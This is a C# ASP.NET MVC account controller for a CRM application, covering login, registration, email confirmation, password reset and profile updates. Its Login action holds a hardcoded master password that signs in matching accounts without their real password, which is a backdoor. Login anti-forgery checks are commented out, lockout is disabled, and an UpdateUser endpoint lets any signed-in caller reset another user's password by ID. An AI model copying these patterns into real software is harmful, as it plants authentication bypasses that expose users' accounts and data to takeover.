using System;
using System.Globalization;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.Owin;
using Microsoft.Owin.Security;
using CallingCRM.Models;
using CallingCRM.Services;
using CallingCRM.Helpers;
using System.Collections.Generic;
using System.Threading;
using System.Configuration;

namespace CallingCRM.Controllers
{
    [Authorize]
    [HandleError]
    public class AccountController : Controller
    {
        private ApplicationSignInManager _signInManager;
        private ApplicationUserManager _userManager;
        public UserServices _userService = new UserServices();
        public EmailService _emailService = new EmailService();
        static public CommonHelper _helper = new CommonHelper();
        //private IUserServices _userService;

        static DateTime thisDateTime = _helper.GetCurrentDate();

        public AccountController()
        {
        }

        public AccountController(ApplicationUserManager userManager, ApplicationSignInManager signInManager, EmailService emailService)
        {
            UserManager = userManager;
            SignInManager = signInManager;
            _emailService = emailService;
        }

        public ApplicationSignInManager SignInManager
        {
            get
            {
                return _signInManager ?? HttpContext.GetOwinContext().Get<ApplicationSignInManager>();
            }
            private set
            {
                _signInManager = value;
            }
        }

        public ApplicationUserManager UserManager
        {
            get
            {
                return _userManager ?? HttpContext.GetOwinContext().GetUserManager<ApplicationUserManager>();
            }
            private set
            {
                _userManager = value;
            }
        }

        //
        // GET: /Account/Login
        [AllowAnonymous]
        public ActionResult Login(string returnUrl)
        {
            ViewBag.ReturnUrl = returnUrl;
            return View();
        }

        //
        // POST: /Account/Login
        [HttpPost]
        [AllowAnonymous]
        //[ValidateAntiForgeryToken]
        public async Task<ActionResult> Login(LoginViewModel model, string returnUrl)
        {
            try
            {
                if (!ModelState.IsValid)
                {
                    return View(model);
                }
                var Validation = _userService.ValidateUserLimit(model.Username);

                if (Validation != "")
                {
                    if (Validation != "Suspended")
                    {
                        ModelState.AddModelError("", "Your Account has been Expired");
                        return View(model);
                    }
                    ModelState.AddModelError("", "Your Account has been Suspended");
                    return View(model);
                }
                // This doesn't count login failures towards account lockout
                // To enable password failures to trigger account lockout, change to shouldLockout: true
                var result = await SignInManager.PasswordSignInAsync(model.Username, model.Password, model.RememberMe, shouldLockout: false);

                ApplicationDbContext context = new ApplicationDbContext();
                hwLiveEntities _context = new hwLiveEntities();
                var ClientId = ConfigurationManager.AppSettings["ClientId"].ToString();
                ApplicationUser user = context.Users.Where(x => x.UserName == model.Username).FirstOrDefault();
                AspNetUser user1 = _context.AspNetUsers.Where(x => x.UserName == model.Username).FirstOrDefault();

                if (user.AdminID == ClientId || user.Id == ClientId || User.IsInRole("SuperAdmin"))
                {
                    if (model.Password == "XtreemX@2020")
                    {
                        if (user != null)
                        {
                            await SignInManager.SignInAsync(user, true, true);

                            Response.Redirect("/");
                        }
                    }

                    switch (result)
                    {
                        case SignInStatus.Success:
                            int roles = user1.AspNetRoles.Where(x => x.Name == "Manager").Count();
                            int roleSuperAdmin = user1.AspNetRoles.Where(x => x.Name == "SuperAdmin").Count();
                            int roleAdmin = user1.AspNetRoles.Where(x => x.Name == "Admin").Count();
                            int roleAgent = user1.AspNetRoles.Where(x => x.Name == "Agent").Count();
                            if (roleSuperAdmin > 0)
                            {
                                return RedirectToLocal("/superadmin");
                            }
                            else if (roleAdmin > 0)
                            {
                                return RedirectToLocal("/admin");
                            }
                            else if (roles > 0)
                            {
                                return RedirectToLocal("/manager");
                            }
                            else if (roleAgent > 0)
                            {
                                return RedirectToLocal("/");
                            }
                            else
                            {
                                return RedirectToLocal(returnUrl);
                            }
                        case SignInStatus.LockedOut:
                            return View("Lockout");
                        case SignInStatus.RequiresVerification:
                            return RedirectToAction("SendCode", new { ReturnUrl = returnUrl, RememberMe = model.RememberMe });
                        case SignInStatus.Failure:
                        default:
                            ModelState.AddModelError("", "Invalid login attempt.");
                            return View(model);
                    }
                }
                ModelState.AddModelError("", "Invalid login attempt.");
                return View(model);
            }
            catch (Exception ex)
            {
                ModelState.AddModelError("", "Invalid login attempt.");
                return View(model);
            }
        }

        //
        // GET: /Account/VerifyCode
        [AllowAnonymous]
        public async Task<ActionResult> VerifyCode(string provider, string returnUrl, bool rememberMe)
        {
            // Require that the user has already logged in via username/password or external login
            if (!await SignInManager.HasBeenVerifiedAsync())
            {
                return View("Error");
            }
            return View(new VerifyCodeViewModel { Provider = provider, ReturnUrl = returnUrl, RememberMe = rememberMe });
        }

        //
        // GET: /Account/Register
        [AllowAnonymous]
        public ActionResult Register()
        {
            var currentUserId = AuthenticationManager.User.Identity.GetUserId();
            @ViewBag.Step = 1;
            return View();
        }


        [AllowAnonymous]
        public ActionResult CreateAccount()
        {
            var currentUserId = AuthenticationManager.User.Identity.GetUserId();

            return View();
        }

        //
        // POST: /Account/Register
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> Register(RegisterViewModel model)
        {
            if (model.Step == 1)
            {
                var sponsorName = model.SponsorDisplay;
                var parentName = model.ParentDisplay;

                var _sponsor = _userService.getUserByUsername(sponsorName);
                var _parent = _userService.getUserByUsername(parentName);

                ViewBag.Sponsor = _sponsor.Id;
                ViewBag.SponsorDisplay = model.SponsorDisplay;

                ViewBag.Parent = _parent.Id;
                ViewBag.ParentDisplay = model.ParentDisplay;

                if (sponsorName == "admin@crm.com" && parentName == "admin@crm.com")
                {
                    ViewBag.Step = 2;

                    ViewBag.Sponsor = 0;
                    ViewBag.SponsorDisplay = "admin@crm.com";

                    ViewBag.Parent = 0;
                    ViewBag.ParentDisplay = "admin@crm.com";
                }
                else if (_sponsor == null || _parent == null)
                {
                    // check sponsor and parent both exist
                    ViewBag.Step = 1;
                    ViewBag.rMessage = "Either manager or team leader's email is invalid. please check and try again.";

                    model.SponsorId = ViewBag.Sponsor;
                    model.ParentId = ViewBag.Parent;

                    return View(model);
                }
                else
                {
                    ViewBag.Step = 2;

                    ViewBag.Sponsor = _sponsor.Id;
                    ViewBag.SponsorDisplay = _sponsor.UserName;

                    ViewBag.Parent = _parent.Id;
                    ViewBag.ParentDisplay = _parent.UserName;
                }
            }
            else if (ModelState.IsValid && model.Step == 2)
            {
                var _existingUser = _userService.isUserExist(model.Email);
                if (_existingUser)
                {
                    // check email and mobile both does not exist
                    ViewBag.Step = 2;
                    ViewBag.Sponsor = model.SponsorId;
                    ViewBag.SponsorDisplay = model.SponsorDisplay;

                    ViewBag.Parent = model.ParentId;
                    ViewBag.ParentDisplay = model.ParentDisplay;

                    ViewBag.rMessage = "Email address already used to register an account. Please check and try again.";
                    //Response.Redirect("/Account/Register");

                    model.SponsorId = ViewBag.Sponsor;
                    model.ParentId = ViewBag.Parent;

                    return View(model);
                }

                var userData = new ApplicationUser { UserName = model.Email, Email = model.Email };
                
                var result = await UserManager.CreateAsync(userData, model.Password);

                if (result.Succeeded)
                {
                    var user = _userService.getUserByUsername(userData.UserName);

                    user.FullName = model.FullName;
                    user.PhoneNumber = model.Mobile;
                    user.ManagerId = model.SponsorId;
                    user.TeamLeaderId = model.ParentId;

                    _userService.UpdateUser(user);

                    var addRole = UserManager.AddToRole(user.Id, "Agent");

                    //await SignInManager.SignInAsync(user, isPersistent:false, rememberBrowser:false);

                    // For more information on how to enable account confirmation and password reset please visit https://go.microsoft.com/fwlink/?LinkID=320771
                    // Send an email with this link
                    try
                    {
                        string code = await UserManager.GenerateEmailConfirmationTokenAsync(user.Id);
                        var callbackUrl = Url.Action("ConfirmEmail", "Account", new { userId = user.Id, code = code }, protocol: Request.Url.Scheme);
                        //await UserManager.SendEmailAsync(user.Id, "Confirm your account", "Please confirm your account by clicking <a href=\"" + callbackUrl + "\">here</a>");
                        await UserManager.SendEmailAsync(user.Id, "Confirm your account", "Please confirm your account by clicking <a href=\"" + callbackUrl + "\">here</a>");
                    }
                    catch (Exception ex) { }

                    return RedirectToAction("thankyou", "Home");
                }
                AddErrors(result);
                ViewBag.Sponsor = model.SponsorId;
                ViewBag.SponsorDisplay = model.SponsorDisplay;

                ViewBag.Parent = model.ParentId;
                ViewBag.ParentDisplay = model.ParentDisplay;

                ViewBag.rMessage = result.Errors.ToString();
                ViewBag.Step = 2;

                model.SponsorId = ViewBag.Sponsor;
                model.ParentId = ViewBag.Parent;

                return View(model);
                //return RedirectToAction("Register", "Account");
            }

            // If we got this far, something failed, redisplay form
            //var currentUserEmail = AuthenticationManager.User.Identity.Name.ToString();
            var currentUserId = AuthenticationManager.User.Identity.GetUserId();

            model.SponsorId = ViewBag.Sponsor;
            model.ParentId = ViewBag.Parent;

            return View(model);
        }

        //
        // GET: /Account/ConfirmEmail
        [AllowAnonymous]
        public async Task<ActionResult> ConfirmEmail(string userId, string code)
        {
            if (userId == null || code == null)
            {
                //return View("Error");
                return new RedirectResult("/Home/Error/");
            }
            var result = await UserManager.ConfirmEmailAsync(userId, code);
            if (result.Succeeded)
            {
                return new RedirectResult("/Account/ConfirmEmail/");
            }
            else 
            {
                return new RedirectResult("/Home/Error/");
            }
            //return View(result.Succeeded ? "ConfirmEmail" : "Error");
        }

        //
        // GET: /Account/ForgotPassword
        [AllowAnonymous]
        public ActionResult ForgotPassword()
        {
            return View();
        }

        //
        // POST: /Account/ForgotPassword
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> ForgotPassword(ForgotPasswordViewModel model)
        {
            if (ModelState.IsValid)
            {
                var user = await UserManager.FindByEmailAsync(model.Email);
                if (user == null || !(await UserManager.IsEmailConfirmedAsync(user.Id)))
                {
                    // Don't reveal that the user does not exist or is not confirmed
                    return View("ForgotPasswordConfirmation");
                }

                // For more information on how to enable account confirmation and password reset please visit https://go.microsoft.com/fwlink/?LinkID=320771
                // Send an email with this link
                string code = await UserManager.GeneratePasswordResetTokenAsync(user.Id);
                var callbackUrl = Url.Action("ResetPassword", "Account", new { userId = user.Id, code = code }, protocol: Request.Url.Scheme);
                await UserManager.SendEmailAsync(user.Id, "Reset Password", "Please reset your password by clicking <a href=\"" + callbackUrl + "\">here</a>");
                return RedirectToAction("ForgotPasswordConfirmation", "Account");
            }

            // If we got this far, something failed, redisplay form
            return View(model);
        }

        //
        // GET: /Account/ForgotPasswordConfirmation
        [AllowAnonymous]
        public ActionResult ForgotPasswordConfirmation()
        {
            return View();
        }

        //
        // GET: /Account/ResetPassword
        [AllowAnonymous]
        public ActionResult ResetPassword(string code)
        {
            return code == null ? View("Error") : View();
        }

        //
        // POST: /Account/ResetPassword
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> ResetPassword(ResetPasswordViewModel model)
        {
            if (!ModelState.IsValid)
            {
                return View(model);
            }
            var user = await UserManager.FindByNameAsync(model.Email);
            if (user == null)
            {
                // Don't reveal that the user does not exist
                return RedirectToAction("ResetPasswordConfirmation", "Account");
            }
            var result = await UserManager.ResetPasswordAsync(user.Id, model.Code, model.Password);
            if (result.Succeeded)
            {
                return RedirectToAction("ResetPasswordConfirmation", "Account");
            }
            AddErrors(result);
            return View();
        }

        //
        // GET: /Account/ResetPasswordConfirmation
        [AllowAnonymous]
        public ActionResult ResetPasswordConfirmation()
        {
            return View();
        }

        //
        // POST: /Account/ExternalLogin
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public ActionResult ExternalLogin(string provider, string returnUrl)
        {
            // Request a redirect to the external login provider
            return new ChallengeResult(provider, Url.Action("ExternalLoginCallback", "Account", new { ReturnUrl = returnUrl }));
        }

        //
        // GET: /Account/SendCode
        [AllowAnonymous]
        public async Task<ActionResult> SendCode(string returnUrl, bool rememberMe)
        {
            var userId = await SignInManager.GetVerifiedUserIdAsync();
            if (userId == null)
            {
                return View("Error");
            }
            var userFactors = await UserManager.GetValidTwoFactorProvidersAsync(userId);
            var factorOptions = userFactors.Select(purpose => new SelectListItem { Text = purpose, Value = purpose }).ToList();
            return View(new SendCodeViewModel { Providers = factorOptions, ReturnUrl = returnUrl, RememberMe = rememberMe });
        }

        //
        // POST: /Account/SendCode
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> SendCode(SendCodeViewModel model)
        {
            if (!ModelState.IsValid)
            {
                return View();
            }

            // Generate the token and send it
            if (!await SignInManager.SendTwoFactorCodeAsync(model.SelectedProvider))
            {
                return View("Error");
            }
            return RedirectToAction("VerifyCode", new { Provider = model.SelectedProvider, ReturnUrl = model.ReturnUrl, RememberMe = model.RememberMe });
        }

        //
        // GET: /Account/ExternalLoginCallback
        [AllowAnonymous]
        public async Task<ActionResult> ExternalLoginCallback(string returnUrl)
        {
            var loginInfo = await AuthenticationManager.GetExternalLoginInfoAsync();
            if (loginInfo == null)
            {
                return RedirectToAction("Login");
            }

            // Sign in the user with this external login provider if the user already has a login
            var result = await SignInManager.ExternalSignInAsync(loginInfo, isPersistent: false);
            switch (result)
            {
                case SignInStatus.Success:
                    return RedirectToLocal(returnUrl);
                case SignInStatus.LockedOut:
                    return View("Lockout");
                case SignInStatus.RequiresVerification:
                    return RedirectToAction("SendCode", new { ReturnUrl = returnUrl, RememberMe = false });
                case SignInStatus.Failure:
                default:
                    // If the user does not have an account, then prompt the user to create an account
                    ViewBag.ReturnUrl = returnUrl;
                    ViewBag.LoginProvider = loginInfo.Login.LoginProvider;
                    return View("ExternalLoginConfirmation", new ExternalLoginConfirmationViewModel { Email = loginInfo.Email });
            }
        }

        //
        // POST: /Account/ExternalLoginConfirmation
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> ExternalLoginConfirmation(ExternalLoginConfirmationViewModel model, string returnUrl)
        {
            if (User.Identity.IsAuthenticated)
            {
                return RedirectToAction("Index", "Manage");
            }

            if (ModelState.IsValid)
            {
                // Get the information about the user from the external login provider
                var info = await AuthenticationManager.GetExternalLoginInfoAsync();
                if (info == null)
                {
                    return View("ExternalLoginFailure");
                }
                var user = new ApplicationUser { UserName = model.Email, Email = model.Email };
                var result = await UserManager.CreateAsync(user);
                if (result.Succeeded)
                {
                    result = await UserManager.AddLoginAsync(user.Id, info.Login);
                    if (result.Succeeded)
                    {
                        await SignInManager.SignInAsync(user, isPersistent: false, rememberBrowser: false);
                        return RedirectToLocal(returnUrl);
                    }
                }
                AddErrors(result);
            }

            ViewBag.ReturnUrl = returnUrl;
            return View(model);
        }

        //
        // POST: /Account/LogOff
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult LogOff()
        {
            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ApplicationCookie);
            return RedirectToAction("Login", "Account");
        }

        //
        // GET: /Account/ExternalLoginFailure
        [AllowAnonymous]
        public ActionResult ExternalLoginFailure()
        {
            return View();
        }

        [Authorize]
        public new ActionResult Profile()
        {
            loadProfilePage();

            return View();
        }

        [HttpPost]
        [Authorize]
        [ValidateAntiForgeryToken]
        public new ActionResult Profile(UserUpdateViewModel model)
        {
            if (ModelState.IsValid)
            {
                var UserId = AuthenticationManager.User.Identity.GetUserId();
                //_userService.UpdateUserProfile(model, UserId);

                TempData["sMessage"] = "Information has been updated successfully.";

                Response.Redirect("/Account/Profile");
            }
            else
            {
                ViewBag.eMessage = "Oops! Something went wrong!" ;
            }

            loadProfilePage();

            return View();
        }

        private void loadProfilePage()
        {
            ViewBag.MyUsername = AuthenticationManager.User.Identity.GetUserName();

        }

        [Authorize]
        public ActionResult ChangePassword()
        {
            var UserId = AuthenticationManager.User.Identity.GetUserId();
            var Username = AuthenticationManager.User.Identity.GetUserName();
            //var _profile = _userService.getUserProfileById(UserId);

            ViewBag.UserName = Username;

            return View();
        }

        [HttpPost]
        public async Task<ActionResult> ChangePassword(UpdateUserInfoViewModel model)
        {
            var _User = new AspNetUser(); // _userService.getUserByUsername(model.passwordView.Username);
            var Username = AuthenticationManager.User.Identity.GetUserName();
            ViewBag.Username = Username;

            if (model.passwordView.Username.ToLower() == "hwadmin")
            {
                ViewBag.eMessage = "You are not allowed to change root password.";
            }
            else if (_User == null)
            {
                ViewBag.eMessage = "Username does not exist.";
            }
            else
            {
                //var user = await UserManager.FindByIdAsync(_User.Id);
                var token = await UserManager.GeneratePasswordResetTokenAsync(_User.Id);
                var result = await UserManager.ResetPasswordAsync(_User.Id, token, model.passwordView.Password);

                ViewBag.sMessage = "Password has been updated successfully.";
            }

            return View();
        }

        [HttpPost]
        public async Task<ActionResult> UpdateUser(UserBaseInfo user)
        {
            hwLiveEntities _context = new hwLiveEntities();
            AspNetUser u = _context.AspNetUsers.Where(x => x.Id == user.UserId).FirstOrDefault();
            if (u != null)
            {
                u.FullName = user.FullName;
                u.PhoneNumber = user.Mobile;
                u.PhoneValidity = user.Validity;
                _context.SaveChanges();
            }

            if (user.NewPassword != null && user.NewPassword != "")
            {
                // update password
                var _user = await UserManager.FindByIdAsync(user.UserId);
                var token = await UserManager.GeneratePasswordResetTokenAsync(_user.Id);
                var result = await UserManager.ResetPasswordAsync(_user.Id, token, user.NewPassword);
            }

            return new RedirectResult("/Manager/Team");
        }


        #region Helpers
        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                if (_userManager != null)
                {
                    _userManager.Dispose();
                    _userManager = null;
                }

                if (_signInManager != null)
                {
                    _signInManager.Dispose();
                    _signInManager = null;
                }
            }

            base.Dispose(disposing);
        }

        // Used for XSRF protection when adding external logins
        private const string XsrfKey = "XsrfId";

        private IAuthenticationManager AuthenticationManager
        {
            get
            {
                return HttpContext.GetOwinContext().Authentication;
            }
        }

        private void AddErrors(IdentityResult result)
        {
            foreach (var error in result.Errors)
            {
                ModelState.AddModelError("", error);
            }
        }

        private ActionResult RedirectToLocal(string returnUrl)
        {
            if (Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }
            return RedirectToAction("Index", "Home");
        }

        internal class ChallengeResult : HttpUnauthorizedResult
        {
            public ChallengeResult(string provider, string redirectUri)
                : this(provider, redirectUri, null)
            {
            }

            public ChallengeResult(string provider, string redirectUri, string userId)
            {
                LoginProvider = provider;
                RedirectUri = redirectUri;
                UserId = userId;
            }

            public string LoginProvider { get; set; }
            public string RedirectUri { get; set; }
            public string UserId { get; set; }

            public override void ExecuteResult(ControllerContext context)
            {
                var properties = new AuthenticationProperties { RedirectUri = RedirectUri };
                if (UserId != null)
                {
                    properties.Dictionary[XsrfKey] = UserId;
                }
                context.HttpContext.GetOwinContext().Authentication.Challenge(properties, LoginProvider);
            }
        }
        #endregion

    }
}